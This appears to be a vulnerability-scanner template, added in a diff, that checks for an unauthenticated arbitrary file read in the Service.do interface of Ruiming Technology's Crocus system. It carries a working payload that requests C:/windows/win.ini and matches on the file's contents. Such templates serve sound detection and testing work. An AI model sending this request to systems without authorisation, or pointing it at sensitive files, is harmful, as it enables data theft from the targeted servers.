@@ -1,0 +1,27 @@
+id: crocus-lfi
+brief:
+    title: Crocus system Service.do - Arbitrary File Read
+    by: pussycat0x
+    level: high
+    about: There is an arbitrary file reading vulnerability in the Service.do interface of Ruiming Technology's Crocus system. An unauthenticated remote attacker can use this vulnerability to read important s...
+    label:
+        - crocus
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Service.do?Action=Download&Path=C:/windows/win.ini'
+      head:
+        X-Requested-With: XMLHttpRequest
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
